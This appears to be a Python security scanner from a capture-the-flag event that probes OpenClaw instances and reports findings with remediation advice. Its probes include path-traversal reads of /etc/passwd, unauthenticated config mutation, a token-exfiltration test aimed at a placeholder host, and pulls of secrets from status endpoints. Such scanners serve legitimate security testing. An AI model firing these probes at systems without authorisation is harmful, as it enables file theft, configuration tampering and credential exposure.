#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════╗
║   CLAW BREAKER — Automated OpenClaw Security Scanner         ║
║   Built live at Break OpenClaw Hack Night (Mar 17, 2026)     ║
║   by Ahmed Bakr (@itsbakr)                                   ║
╚═══════════════════════════════════════════════════════════════╝

Probes an OpenClaw instance for 7 real vulnerability classes
discovered during the Break OpenClaw CTF. Runs inside a Blaxel
sandbox for isolated, safe execution.
"""

import json
import re
import sys
import time
import argparse
import socket
from dataclasses import dataclass, field, asdict
from typing import Optional
from urllib.parse import urljoin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ── Severity Levels ──────────────────────────────────────────
CRITICAL = "CRITICAL"
HIGH = "HIGH"
MEDIUM = "MEDIUM"
LOW = "LOW"
INFO = "INFO"

# ── Data Structures ──────────────────────────────────────────

@dataclass
class Finding:
    probe_id: str
    probe_name: str
    severity: str
    status: str  # VULNERABLE / SAFE / ERROR
    description: str
    evidence: str = ""
    remediation: str = ""
    cwe: str = ""
    latency_ms: float = 0.0


@dataclass
class ScanReport:
    target_gateway: str
    target_control: str
    scan_start: str = ""
    scan_end: str = ""
    scan_duration_ms: float = 0.0
    findings: list = field(default_factory=list)
    summary: dict = field(default_factory=dict)

    def add(self, finding: Finding):
        self.findings.append(finding)

    def compute_summary(self):
        total = len(self.findings)
        vuln = [f for f in self.findings if f.status == "VULNERABLE"]
        safe = [f for f in self.findings if f.status == "SAFE"]
        errors = [f for f in self.findings if f.status == "ERROR"]

        severity_counts = {CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0, INFO: 0}
        for f in vuln:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1

        risk_score = (
            severity_counts[CRITICAL] * 10
            + severity_counts[HIGH] * 7
            + severity_counts[MEDIUM] * 4
            + severity_counts[LOW] * 1
        )
        max_score = total * 10
        risk_pct = round((risk_score / max_score) * 100) if max_score > 0 else 0

        self.summary = {
            "total_probes": total,
            "vulnerable": len(vuln),
            "safe": len(safe),
            "errors": len(errors),
            "severity_breakdown": severity_counts,
            "risk_score": risk_score,
            "risk_percentage": risk_pct,
            "risk_rating": (
                "CRITICAL" if risk_pct >= 70
                else "HIGH" if risk_pct >= 50
                else "MEDIUM" if risk_pct >= 30
                else "LOW"
            ),
        }

    def to_dict(self):
        self.compute_summary()
        return {
            "target": {
                "gateway": self.target_gateway,
                "control_ui": self.target_control,
            },
            "timing": {
                "start": self.scan_start,
                "end": self.scan_end,
                "duration_ms": self.scan_duration_ms,
            },
            "summary": self.summary,
            "findings": [asdict(f) for f in self.findings],
        }


# ── HTTP Helper ──────────────────────────────────────────────

def safe_request(method, url, timeout=8, **kwargs):
    """Make an HTTP request and return (response, latency_ms) or (None, latency_ms)."""
    start = time.monotonic()
    try:
        resp = requests.request(method, url, timeout=timeout, allow_redirects=False, **kwargs)
        elapsed = (time.monotonic() - start) * 1000
        return resp, elapsed
    except requests.RequestException:
        elapsed = (time.monotonic() - start) * 1000
        return None, elapsed


# ── Probe Implementations ────────────────────────────────────

def probe_skills_status_leak(control_url: str) -> Finding:
    """
    PROBE 1 — Skills Status Secret Leak
    CVE-class: CWE-200 (Information Exposure)
    
    The /api/skills/status endpoint may expose secret tokens
    and API keys in the configChecks response without auth.
    """
    url = f"{control_url}/api/skills/status"
    resp, latency = safe_request("GET", url)

    if resp is None:
        return Finding(
            probe_id="P1", probe_name="Skills Status Secret Leak",
            severity=HIGH, status="ERROR",
            description="Could not reach /api/skills/status endpoint.",
            latency_ms=latency, cwe="CWE-200",
            remediation="Verify the control UI is accessible.",
        )

    body = resp.text
    try:
        data = resp.json()
    except Exception:
        data = {}

    # Look for secrets in configChecks
    secrets_found = []
    config_checks = data.get("configChecks", {})
    for key, val in config_checks.items():
        if val and isinstance(val, str) and not val.startswith("sk-") and len(val) > 10:
            secrets_found.append(f"{key}: {val[:60]}...")
        elif val and isinstance(val, str) and "FLAG{" in val:
            secrets_found.append(f"{key}: [FLAG DETECTED]")

    # Also check nested skills
    skills = data.get("skills", {})
    for skill_name, skill_data in skills.items():
        for k, v in skill_data.get("configChecks", {}).items():
            if v and isinstance(v, str) and len(v) > 10:
                if v not in [cv for cv in config_checks.values()]:
                    secrets_found.append(f"skills.{skill_name}.{k}: {v[:60]}...")

    if secrets_found:
        return Finding(
            probe_id="P1", probe_name="Skills Status Secret Leak",
            severity=HIGH, status="VULNERABLE",
            description="The /api/skills/status endpoint exposes secrets in configChecks without authentication.",
            evidence="\n".join(secrets_found),
            latency_ms=latency, cwe="CWE-200",
            remediation="Redact secret values from the skills status endpoint. Set redactSecrets: true in config. Require authentication for /api/skills/status.",
        )

    return Finding(
        probe_id="P1", probe_name="Skills Status Secret Leak",
        severity=INFO, status="SAFE",
        description="No secrets detected in /api/skills/status response.",
        latency_ms=latency, cwe="CWE-200",
        remediation="No action needed.",
    )


def probe_media_lfi(control_url: str) -> Finding:
    """
    PROBE 2 — Local File Inclusion via /media endpoint
    CVE-class: CWE-22 (Path Traversal)
    
    The /media endpoint may accept absolute paths or traversals,
    allowing arbitrary file reads on the host.
    """
    test_paths = [
        ("/etc/passwd", "root:"),
        ("/etc/hostname", ""),
    ]

    for test_path, expected_content in test_paths:
        url = f"{control_url}/media?path={test_path}"
        resp, latency = safe_request("GET", url)

        if resp is None:
            continue

        body = resp.text
        # If we got file content (not HTML), it's vulnerable
        if resp.status_code == 200 and "<html" not in body.lower()[:200]:
            if expected_content == "" or expected_content in body:
                return Finding(
                    probe_id="P2", probe_name="Local File Inclusion (Media Endpoint)",
                    severity=CRITICAL, status="VULNERABLE",
                    description=f"The /media endpoint reads arbitrary files. Successfully read {test_path}.",
                    evidence=body[:200].strip(),
                    latency_ms=latency, cwe="CWE-22",
                    remediation="Disable allowAbsolutePaths in media config. Implement path sanitization that rejects absolute paths and .. traversals. Restrict media access to a specific directory.",
                )

    # Also try path traversal
    traversal_url = f"{control_url}/media?path=../../../etc/passwd"
    resp, latency = safe_request("GET", traversal_url)
    if resp and resp.status_code == 200 and "root:" in resp.text:
        return Finding(
            probe_id="P2", probe_name="Local File Inclusion (Media Endpoint)",
            severity=CRITICAL, status="VULNERABLE",
            description="The /media endpoint allows path traversal to read arbitrary files.",
            evidence=resp.text[:200].strip(),
            latency_ms=latency, cwe="CWE-22",
            remediation="Implement path canonicalization and restrict reads to a whitelist of directories.",
        )

    return Finding(
        probe_id="P2", probe_name="Local File Inclusion (Media Endpoint)",
        severity=INFO, status="SAFE",
        description="Media endpoint does not appear to allow arbitrary file reads.",
        latency_ms=latency, cwe="CWE-22",
        remediation="No action needed.",
    )


def probe_unauth_config(control_url: str) -> Finding:
    """
    PROBE 3 — Unauthenticated Config Mutation
    CVE-class: CWE-306 (Missing Authentication)
    
    POST /api/config may accept changes without any auth token,
    allowing attackers to mutate gateway configuration.
    """
    url = f"{control_url}/api/config"
    payload = {"test_key": "claw_breaker_probe", "timestamp": time.time()}
    resp, latency = safe_request("POST", url, json=payload)

    if resp is None:
        return Finding(
            probe_id="P3", probe_name="Unauthenticated Config Mutation",
            severity=HIGH, status="ERROR",
            description="Could not reach POST /api/config.",
            latency_ms=latency, cwe="CWE-306",
            remediation="Verify the control UI is accessible.",
        )

    try:
        data = resp.json()
    except Exception:
        data = {}

    if resp.status_code == 200 and data.get("ok") is True:
        return Finding(
            probe_id="P3", probe_name="Unauthenticated Config Mutation",
            severity=CRITICAL, status="VULNERABLE",
            description="POST /api/config accepts mutations without authentication. Attackers can modify gateway configuration remotely.",
            evidence=json.dumps(data, indent=2)[:300],
            latency_ms=latency, cwe="CWE-306",
            remediation="Require a valid auth token for all config mutation endpoints. Implement CSRF protection. Add rate limiting.",
        )

    return Finding(
        probe_id="P3", probe_name="Unauthenticated Config Mutation",
        severity=INFO, status="SAFE",
        description="Config mutation endpoint requires authentication or returned an error.",
        evidence=f"Status: {resp.status_code}",
        latency_ms=latency, cwe="CWE-306",
        remediation="No action needed.",
    )


def probe_gateway_url_exfil(control_url: str) -> Finding:
    """
    PROBE 4 — Auth Token Exfiltration via gatewayUrl
    CVE-class: CWE-918 (SSRF) + CWE-200 (Information Exposure)
    
    When POSTing a gatewayUrl to /api/config, the server may
    connect to that URL and leak the gateway auth token.
    """
    url = f"{control_url}/api/config"
    # We use a non-routable URL to test if the server accepts the field
    payload = {"gatewayUrl": "ws://192.0.2.1:9999/exfil-test"}
    resp, latency = safe_request("POST", url, json=payload, timeout=5)

    if resp is None:
        return Finding(
            probe_id="P4", probe_name="Auth Token Exfiltration via gatewayUrl",
            severity=HIGH, status="ERROR",
            description="Could not reach POST /api/config.",
            latency_ms=latency, cwe="CWE-918",
            remediation="Verify the control UI is accessible.",
        )

    try:
        data = resp.json()
    except Exception:
        data = {}

    if resp.status_code == 200 and data.get("gatewayUrl") is not None:
        return Finding(
            probe_id="P4", probe_name="Auth Token Exfiltration via gatewayUrl",
            severity=CRITICAL, status="VULNERABLE",
            description="The server accepts a gatewayUrl in config POST and attempts to connect to it, leaking the gateway auth token in the WebSocket handshake.",
            evidence=f"Server acknowledged gatewayUrl: {data.get('gatewayUrl')}",
            latency_ms=latency, cwe="CWE-918",
            remediation="Remove gatewayUrl processing from the config endpoint. Never send auth tokens to user-supplied URLs. Validate and whitelist allowed gateway URLs.",
        )

    return Finding(
        probe_id="P4", probe_name="Auth Token Exfiltration via gatewayUrl",
        severity=INFO, status="SAFE",
        description="Server does not appear to process gatewayUrl in config mutations.",
        latency_ms=latency, cwe="CWE-918",
        remediation="No action needed.",
    )


def probe_browser_state_exposure(control_url: str) -> Finding:
    """
    PROBE 5 — Browser State / Stored Secrets Exposure
    CVE-class: CWE-200 (Information Exposure)
    
    The /api/browser/state endpoint may expose stored secrets
    without authentication, enabling CSRF-style attacks.
    """
    for endpoint in ["/api/browser/state", "/api/browser/storage"]:
        url = f"{control_url}{endpoint}"
        resp, latency = safe_request("GET", url)

        if resp is None:
            continue

        try:
            data = resp.json()
        except Exception:
            continue

        if resp.status_code == 200 and data.get("ok") is True:
            storage = data.get("storage", {})
            secret = storage.get("storedSecret", "")

            if secret and len(secret) > 5:
                return Finding(
                    probe_id="P5", probe_name="Browser State / Secret Exposure",
                    severity=HIGH, status="VULNERABLE",
                    description=f"The {endpoint} endpoint exposes stored browser secrets without authentication.",
                    evidence=f"storedSecret present ({len(secret)} chars). Path: {storage.get('path', 'unknown')}",
                    latency_ms=latency, cwe="CWE-200",
                    remediation="Require authentication for browser state endpoints. Do not expose stored secrets via unauthenticated HTTP endpoints.",
                )

    return Finding(
        probe_id="P5", probe_name="Browser State / Secret Exposure",
        severity=INFO, status="SAFE",
        description="Browser state endpoints are not exposed or do not leak secrets.",
        latency_ms=latency if resp else 0, cwe="CWE-200",
        remediation="No action needed.",
    )


def probe_xss_injection(control_url: str) -> Finding:
    """
    PROBE 6 — XSS via Injected Scripts in Control UI
    CVE-class: CWE-79 (Cross-site Scripting)
    
    The Control UI HTML may contain injected scripts that set
    cookies with sensitive data or execute arbitrary JS.
    """
    url = control_url
    resp, latency = safe_request("GET", url)

    if resp is None:
        return Finding(
            probe_id="P6", probe_name="Control UI Script Injection (XSS)",
            severity=MEDIUM, status="ERROR",
            description="Could not reach the control UI.",
            latency_ms=latency, cwe="CWE-79",
            remediation="Verify the control UI is accessible.",
        )

    body = resp.text
    injected_scripts = []

    # Find all inline scripts
    script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL)
    for block in script_blocks:
        # Check for cookie setting
        if "document.cookie" in block:
            cookie_match = re.findall(r'document\.cookie\s*=\s*["\']([^"\']+)', block)
            for cookie in cookie_match:
                injected_scripts.append(f"Cookie injection: {cookie[:80]}")

    # Check Set-Cookie headers
    set_cookies = resp.headers.get("set-cookie", "")
    if "flag" in set_cookies.lower() or "admin" in set_cookies.lower():
        injected_scripts.append(f"Suspicious Set-Cookie header: {set_cookies[:100]}")

    # Check for injected HTML sections (like MOTD with embedded flags)
    motd_sections = re.findall(r'<section[^>]*id="ctf-motd"[^>]*>(.*?)</section>', body, re.DOTALL)
    for section in motd_sections:
        if "FLAG{" in section or len(section) > 200:
            injected_scripts.append(f"Injected MOTD section with sensitive content")

    if injected_scripts:
        return Finding(
            probe_id="P6", probe_name="Control UI Script Injection (XSS)",
            severity=HIGH, status="VULNERABLE",
            description="The Control UI HTML contains injected scripts that set cookies or expose sensitive data. This enables XSS-based credential theft.",
            evidence="\n".join(injected_scripts),
            latency_ms=latency, cwe="CWE-79",
            remediation="Implement Content-Security-Policy headers. Do not inject inline scripts into the Control UI. Serve static assets with integrity hashes. Use HttpOnly + Secure flags on all cookies.",
        )

    return Finding(
        probe_id="P6", probe_name="Control UI Script Injection (XSS)",
        severity=INFO, status="SAFE",
        description="No injected scripts or suspicious cookies detected in the Control UI.",
        latency_ms=latency, cwe="CWE-79",
        remediation="No action needed.",
    )


def probe_log_secret_leak(control_url: str) -> Finding:
    """
    PROBE 7 — Secret Leakage in Gateway Logs
    CVE-class: CWE-532 (Information Exposure Through Log Files)
    
    Checks the /api/status endpoint for leaked secrets and verifies
    if logging config has redactSecrets disabled.
    """
    url = f"{control_url}/api/status"
    resp, latency = safe_request("GET", url)

    if resp is None:
        return Finding(
            probe_id="P7", probe_name="Secret Leakage in Logs / Status",
            severity=MEDIUM, status="ERROR",
            description="Could not reach /api/status.",
            latency_ms=latency, cwe="CWE-532",
            remediation="Verify the control UI is accessible.",
        )

    try:
        data = resp.json()
    except Exception:
        data = {}

    issues = []
    motd = data.get("motd", "")
    if "FLAG{" in motd or (len(motd) > 50 and re.search(r'[a-f0-9]{8}', motd)):
        issues.append(f"MOTD contains sensitive data: {motd[:80]}")

    # Check if the status endpoint itself leaks config
    gateway_info = data.get("gateway", {})
    if gateway_info.get("motd") and "FLAG{" in str(gateway_info.get("motd", "")):
        issues.append("Gateway MOTD in status response contains embedded secrets")

    if issues:
        return Finding(
            probe_id="P7", probe_name="Secret Leakage in Logs / Status",
            severity=MEDIUM, status="VULNERABLE",
            description="The gateway status endpoint exposes sensitive data (flags, tokens) in the MOTD or status response.",
            evidence="\n".join(issues),
            latency_ms=latency, cwe="CWE-532",
            remediation="Enable redactSecrets: true in logging config. Do not embed secrets in the MOTD. Sanitize status endpoint responses.",
        )

    return Finding(
        probe_id="P7", probe_name="Secret Leakage in Logs / Status",
        severity=INFO, status="SAFE",
        description="No secrets detected in status endpoint response.",
        latency_ms=latency, cwe="CWE-532",
        remediation="No action needed.",
    )


# ── Scanner Engine ───────────────────────────────────────────

PROBES = [
    probe_skills_status_leak,
    probe_media_lfi,
    probe_unauth_config,
    probe_gateway_url_exfil,
    probe_browser_state_exposure,
    probe_xss_injection,
    probe_log_secret_leak,
]


def run_scan(gateway_url: str, control_url: str) -> ScanReport:
    """Execute all probes against the target and return a ScanReport."""
    report = ScanReport(
        target_gateway=gateway_url,
        target_control=control_url,
        scan_start=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    )

    scan_start = time.monotonic()

    for probe_fn in PROBES:
        try:
            finding = probe_fn(control_url)
        except Exception as e:
            finding = Finding(
                probe_id="ERR",
                probe_name=probe_fn.__name__,
                severity=INFO,
                status="ERROR",
                description=f"Probe crashed: {str(e)[:200]}",
            )
        report.add(finding)

    report.scan_end = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    report.scan_duration_ms = round((time.monotonic() - scan_start) * 1000, 1)
    report.compute_summary()

    return report


# ── CLI ──────────────────────────────────────────────────────

SEVERITY_COLORS = {
    CRITICAL: "\033[91m",  # red
    HIGH: "\033[93m",      # yellow
    MEDIUM: "\033[33m",    # orange
    LOW: "\033[36m",       # cyan
    INFO: "\033[90m",      # gray
}
RESET = "\033[0m"
BOLD = "\033[1m"
GREEN = "\033[92m"
RED = "\033[91m"


def print_banner():
    print(f"""
{BOLD}╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ▄████▄  ██▓    ▄▄▄      █     █░    ▄▄▄▄   ██▀███         ║
║  ▒██▀ ▀█ ▓██▒   ▒████▄   ▓█░ █ ░█░   ▓█████▄▓██ ▒ ██▒       ║
║  ▒▓█    ▄▒██░   ▒██  ▀█▄ ▒█░ █ ░█    ▒██▒ ▄██▓██ ░▄█ ▒       ║
║  ▒▓▓▄ ▄██▒██░   ░██▄▄▄▄██░█░ █ ░█    ▒██░█▀  ▒██▀▀█▄        ║
║  ▒ ▓███▀ ░██████▒▓█   ▓██▒░░██▒██▓    ░▓█  ▀█▓░██▓ ▒██▒      ║
║  ░ ░▒ ▒  ░ ▒░▓  ░▒▒   ▓▒█░░ ▓░▒ ▒     ░▒▓███▀▒░ ▒▓ ░▒▓░     ║
║                                                               ║
║          CLAW BREAKER — OpenClaw Security Scanner             ║
║          Built at Break OpenClaw Hack Night 2026              ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝{RESET}
""")


def print_report(report: ScanReport):
    s = report.summary
    rating_color = SEVERITY_COLORS.get(s["risk_rating"], "")

    print(f"\n{BOLD}═══ SCAN RESULTS ═══{RESET}")
    print(f"  Target:   {report.target_control}")
    print(f"  Duration: {report.scan_duration_ms}ms")
    print(f"  Risk:     {rating_color}{BOLD}{s['risk_rating']} ({s['risk_percentage']}%){RESET}")
    print(f"  Findings: {RED}{s['vulnerable']} vulnerable{RESET} / {GREEN}{s['safe']} safe{RESET} / {s['errors']} errors")
    print()

    for f in report.findings:
        status_icon = f"{RED}✗ VULN{RESET}" if f.status == "VULNERABLE" else (
            f"{GREEN}✓ SAFE{RESET}" if f.status == "SAFE" else "⚠ ERR "
        )
        sev_color = SEVERITY_COLORS.get(f.severity, "")

        print(f"  {BOLD}[{f.probe_id}]{RESET} {status_icon}  {sev_color}{f.severity:8s}{RESET}  {f.probe_name}  ({f.latency_ms:.0f}ms)")
        if f.status == "VULNERABLE":
            print(f"       {f.description}")
            if f.evidence:
                for line in f.evidence.split("\n")[:3]:
                    print(f"       {BOLD}→{RESET} {line}")
            print(f"       {GREEN}Fix:{RESET} {f.remediation[:120]}")
        print()


def main():
    parser = argparse.ArgumentParser(description="Claw Breaker — OpenClaw Security Scanner")
    parser.add_argument("--target", required=True, help="Base URL of the OpenClaw host (e.g. https://ide-xxx-prod.fly.dev)")
    parser.add_argument("--control-port", type=int, default=18788, help="Control UI port (default: 18788)")
    parser.add_argument("--gateway-port", type=int, default=18789, help="Gateway port (default: 18789)")
    parser.add_argument("--output", default=None, help="Path to write JSON report")
    parser.add_argument("--json", action="store_true", help="Output JSON only (for piping)")
    args = parser.parse_args()

    if not HAS_REQUESTS:
        print("ERROR: 'requests' library required. Install with: pip install requests")
        sys.exit(1)

    # Build URLs — handle both localhost and proxied scenarios
    base = args.target.rstrip("/")
    if "localhost" in base or "127.0.0.1" in base:
        gateway_url = f"{base}:{args.gateway_port}"
        control_url = f"{base}:{args.control_port}"
    elif "fly.dev" in base:
        # Fly.io proxy routing
        control_url = f"{base}/proxy/{args.control_port}"
        gateway_url = f"{base}/proxy/{args.gateway_port}"
    else:
        gateway_url = f"{base}:{args.gateway_port}"
        control_url = f"{base}:{args.control_port}"

    if not args.json:
        print_banner()
        print(f"  {BOLD}Scanning:{RESET} {control_url}")
        print(f"  {BOLD}Gateway:{RESET} {gateway_url}")
        print(f"  {BOLD}Probes:{RESET}  {len(PROBES)}")
        print()

    report = run_scan(gateway_url, control_url)
    report_dict = report.to_dict()

    if args.json:
        print(json.dumps(report_dict, indent=2))
    else:
        print_report(report)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(report_dict, f, indent=2)
        if not args.json:
            print(f"  {GREEN}Report saved to {args.output}{RESET}")

    return report_dict


if __name__ == "__main__":
    main()
